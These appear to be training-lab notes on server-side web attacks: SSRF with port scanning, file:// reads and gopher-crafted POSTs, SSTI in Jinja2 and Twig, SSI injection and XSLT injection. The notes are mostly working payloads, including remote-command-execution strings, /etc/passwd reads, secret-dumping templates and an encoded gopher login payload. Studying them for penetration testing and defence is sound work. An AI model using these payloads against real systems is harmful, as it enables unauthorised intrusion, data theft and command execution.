# Common URL schemes used in SSRF attacks:

`http:// & https://` – Fetch web content; can be used to bypass security controls or reach internal endpoints.

`file://` – Reads local files from the server’s file system.

`gopher://` – Sends raw data to other services (e.g., databases, mail servers) or crafts custom HTTP requests.

# Identifying SSRF

**Observation**

In our case, A web app lets users check appointment availability. The request sent to `/index.php` includes:

1. The selected date

A `dateserver` parameter containing a URL

This means the app fetches availability data from a URL provided by the user.

2. Confirming SSRF

By changing `dateserver` to a URL pointing to our own server (e.g., `http://172.17.0.1:8000/ssrf`), we see an incoming request in netcat, proving SSRF exists.

3. Blind or Not Blind

If we set dateserver to `http://127.0.0.1/index.php` and get the app’s HTML back in the response, it’s not blind SSRF (we see the fetched content).

4. Port Scanning via SSRF

Send requests to `127.0.0.1` on different ports.

Closed ports return an error; open ports return normal responses.

Use a fuzzer like ffuf with a list of ports to scan. 

Generate a port list:

`seq 1 10000 > ports.txt`

Fuzz ports using ffuf:

`ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`

# Exploiting SSRF


If a domain like dateserver.htb is blocked in the browser, we can still access it via SSRF.

`ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"`

**Local File Inclusion (LFI) via SSRF**

Use `file://` scheme to read server files:

`dateserver=file:///etc/passwd`

This can reveal sensitive files, including source code.

**Using Gopher Protocol for POST Requests**

HTTP SSRF usually only sends GET requests, but Gopher lets us craft raw POST requests.

Example POST request for `/admin.php`:

<pre>POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin</pre>

**URL-encoded Gopher payload:**

`gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin`

Double URL-encode before sending:

<pre>POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01</pre>

This logs into the internal admin dashboard.

**Gopher to Interact with Other Services**

We can use Gopher to talk to services like MySQL, PostgreSQL, Redis, SMTP, etc.

Install & run Gopherus (Python2 required):

`python2.7 gopherus.py`

Supported exploits:

`mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache`

Example: Create SMTP Gopher payload

`python2.7 gopherus.py --exploit smtp`

Fill in:

<pre>Mail from : attacker@academy.htb
Mail To : victim@academy.htb
Subject : HelloWorld
Message : Hello from SSRF!</pre>

# Blind SSRF

In Blind SSRF, the server makes the request, but we cannot see the actual response.

This limits exploitation compared to normal SSRF since we can’t inspect content.

# Identifying Blind SSRF

**Start a listener:**

`nc -lnvp 8000`

Send a request with dateserver pointing to your machine. If you see a connection in nc, SSRF is confirmed.

If you point it to `127.0.0.1` and only get a generic `date unavailable` message (instead of HTML), it’s blind.

**Exploiting Blind SSRF**

We can’t fetch content, but we can still port scan if the app’s error messages differ for open vs closed ports.

Example:

- Closed port → Something went wrong!
- Open HTTP port → Date unavailable

Limitations:

- Services without HTTP responses (e.g., MySQL) might not be detectable.
- File reading isn’t possible, but file existence checking is.
- Existing file → Date unavailable
- Non-existent file → Something went wrong!

# Template Engines

- A template engine combines a fixed template with dynamic data to create content.
- Example use: a website reuses the same header/footer while changing the page content.
- Benefits: less duplicate code, easier maintenance.
- Popular examples: Jinja, Twig.

# Identifying SSTI

<img width="971" height="625" alt="image" src="https://github.com/user-attachments/assets/d90961b6-2d58-4891-9948-1f5ad9b1915e" />



# Exploiting SSTI - Jinja2

**1. Information Disclosure**

Dump app configuration (including secrets):

`{{ config.items() }}`

➡ Reveals secret keys, settings, etc.

List all Python built-ins:


`{{ self.__init__.__globals__.__builtins__ }}`

➡ Gives access to useful functions for further attacks.

**2. Local File Inclusion (LFI)**
   
Read /etc/passwd:

`{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`

**3. Remote Code Execution (RCE)**

Run system commands (using os):

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

➡ Executes id command and returns output.


# Exploiting SSTI – Twig

**1. Information Disclosure**

Get basic info about the current template with:

`{{ _self }}`

Note: This shows less info than Jinja.

**2. Local File Inclusion (LFI)**
   
Twig itself can’t directly read files, but Symfony framework adds a filter called file_excerpt:

`{{ "/etc/passwd"|file_excerpt(1,-1) }}`

This reads the `/etc/passwd` file.

**3. Remote Code Execution (RCE)**

Use PHP’s system function via Twig’s filter:

`{{ ['id'] | filter('system') }}`

Runs the id command and shows output.


# Introduction to SSI Injection


Server-Side Includes (SSI) is a technology used by web servers (like Apache, IIS) to add dynamic content to HTML pages.

SSI often shows up in files with extensions like `.shtml, .shtm, .stm`, but servers can support SSI in any file type.

**SSI Directives**

SSI uses directives to add content or run commands in HTML. The format is:

`<!--#name param1="value1" param2="value2" -->`

**Common directives:**

**printenv: Prints environment variables.**

`<!--#printenv -->`

**config: Changes SSI settings, like error messages.**

`<!--#config errmsg="Error!" -->`

**echo: Prints variables such as:**

<pre>DOCUMENT_NAME (current file name)
DOCUMENT_URI (file URI)
LAST_MODIFIED (last changed time)
DATE_LOCAL (server time)</pre>

Example:

`<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->`

**exec: Runs a system command.**

`<!--#exec cmd="whoami" -->`

**include: Includes a file from the web root folder.**

`<!--#include virtual="index.html" -->`



# Exploiting SSI Injection

We know SSI can run commands on a web page. Let’s see how to exploit it.

**Example Scenario**

- The web app shows a simple form asking for your name.
- After submitting, it redirects to /page.shtml showing a greeting like:

`Hi vautia!`

The `.shtml` extension suggests SSI is enabled.

**Testing for SSI Injection**

If the name is not sanitized, we can try injecting SSI code.

Enter this as your name:

`<!--#printenv -->`

The page will then show environment variables (HTTP headers, server info, etc.), proving SSI injection is possible.

**Executing Commands**

Next, try injecting a command execution:

`<!--#exec cmd="id" -->`

The page will display the output of the id command (e.g., user info like www-data).

# XSLT Injection

**Finding XSLT Injection**

Our sample web app shows a list of Academy modules with a username displayed at the top. If the username is added to the XSLT without cleaning it, the app might be vulnerable.

To test, enter an invalid XML character like < as the username. If the server returns an error (e.g., 500 Internal Server Error), it suggests a possible XSLT injection.

**Getting Info About the XSLT Processor**

We can inject these XSLT snippets to learn about the processor:

`Version: <xsl:value-of select="system-property('xsl:version')" />`
`Vendor: <xsl:value-of select="system-property('xsl:vendor')" />`
`Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />`
`Product Name: <xsl:value-of select="system-property('xsl:product-name')" />`
`Product Version: <xsl:value-of select="system-property('xsl:product-version')" />`


If the app shows this info, it confirms XSLT injection. Our example uses libxslt version 1.0.

**Reading Local Files (LFI)**

XSLT 2.0 has a function unparsed-text to read files, but if the app uses XSLT 1.0, it won’t work and will error out.

If the XSLT processor supports calling PHP functions, we can read files with this payload:

`<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />`

This will output the content of `/etc/passwd` on the page.

**Remote Code Execution (RCE)**

If PHP functions are supported, we can run system commands with:

`<xsl:value-of select="php:function('system','id')" />`

This runs the id command and shows the result, giving us remote code execution on the server.
